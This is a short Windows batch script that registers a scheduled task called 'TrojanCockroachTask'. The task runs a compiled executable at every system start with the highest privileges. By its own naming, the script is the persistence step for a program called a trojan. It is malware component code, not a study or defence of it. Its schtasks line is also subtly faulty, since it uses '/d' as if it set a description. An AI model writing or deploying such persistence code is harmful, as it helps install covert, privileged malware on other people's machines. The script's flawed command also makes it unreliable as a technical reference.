@echo off
setlocal

set EXE_PATH=%~dp0YourCompiledFilename.exe
set TASK_NAME=TrojanCockroachTask
set TASK_DESC=Runs TrojanCockroach on startup

schtasks /create /tn %TASK_NAME% /tr %EXE_PATH% /sc onstart /rl highest /f /d %TASK_DESC%

endlocal
